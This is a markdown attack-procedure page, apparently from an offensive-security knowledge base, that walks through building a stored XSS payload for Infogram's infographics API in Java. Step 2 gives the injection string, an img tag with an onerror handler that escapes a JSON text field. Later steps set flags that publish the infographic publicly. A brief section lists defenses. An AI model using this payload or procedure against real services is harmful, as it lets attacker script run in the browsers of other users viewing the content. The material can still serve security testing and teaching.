---
id: proc-infogram-xss-payload-001
tags:
  - xss-payload
  - injection
type: procedure
tools:
  - '[[tools/Infogram-Java-API-Library]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/Create-Parameters-HashMap]]'
  - '[[commands/Set-Content-XSS-Payload]]'
  - '[[commands/Set-Theme-ID-Parameter]]'
  - '[[commands/Set-Title-Parameter]]'
  - '[[commands/Set-Publish-Parameter]]'
  - '[[commands/Set-Publish-Mode-Parameter]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:32:10.720Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Prepare-Malicious-XSS-Payload-for-Infographic-Content

## Summary

This procedure crafts a JSON payload for the 'content' parameter in Infogram's API, injecting a stored XSS via an HTML img tag that alerts the document domain upon rendering in the dashboard.

## Description

The vulnerability stems from unsanitized 'content' JSON in POST /infographics, allowing HTML/JS injection stored and reflected in dashboard views. This step prepares the payload in Java using the API library, targeting authenticated users viewing projects. Prerequisites: API credentials and library setup. Outcomes: Malicious parameters ready for submission, leading to JS execution.

## Requirements

1. Infogram API key and secret
2. Java environment with library imported
3. Knowledge of JSON escaping for payloads

## Defense

Defensive measures and detection strategies:

- Implement HTML/JS sanitization or encoding on 'content' fields before storage/rendering
- Use Content Security Policy (CSP) to block inline scripts and unsafe tags like img onerror
- Scan API payloads for known XSS patterns using WAF

## Objectives

1. Inject executable JavaScript into stored infographic content
2. Ensure payload survives JSON serialization and API processing
3. Set supporting parameters for successful creation and public visibility

## Instructions

### Step 1: Initialize Parameters Map

**Context**: Create a HashMap to hold all request parameters.

Execute [[commands/Create-Parameters-HashMap]] to start the map:

```java
Map<String, String> parameters = new HashMap<String, String>();
```

> Creates an empty map for adding keys like 'content'. Expected: No errors, map ready.

### Step 2: Set Malicious Content Payload

**Context**: Add the XSS-injecting JSON to 'content'.

Execute [[commands/Set-Content-XSS-Payload]]:

```java
parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\"'<img src=a onerror=alert(document.domain)>\"}"]");
```

> Escaped JSON with img tag; breaks out of text field. Expected: Parameter added.

### Step 3: Configure Theme and Metadata

**Context**: Add non-malicious parameters for creation.

Execute [[commands/Set-Theme-ID-Parameter]]:

```java
parameters.put("theme_id", "7291");
```

Then [[commands/Set-Title-Parameter]]:

```java
parameters.put("title","title");
```

And [[commands/Set-Publish-Parameter]]:

```java
parameters.put("publish", "true");
```

Followed by [[commands/Set-Publish-Mode-Parameter]]:

```java
parameters.put("publish_mode", "public");
```

> Sets theme, title, and publish flags. Expected: All parameters populated.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

-

## Commands Used

- [[commands/Create-Parameters-HashMap]]
- [[commands/Set-Content-XSS-Payload]]
- [[commands/Set-Theme-ID-Parameter]]
- [[commands/Set-Title-Parameter]]
- [[commands/Set-Publish-Parameter]]
- [[commands/Set-Publish-Mode-Parameter]]

## Tools Used

- [[tools/Infogram-Java-API-Library]]

## Tags

- xss
- payload-prep
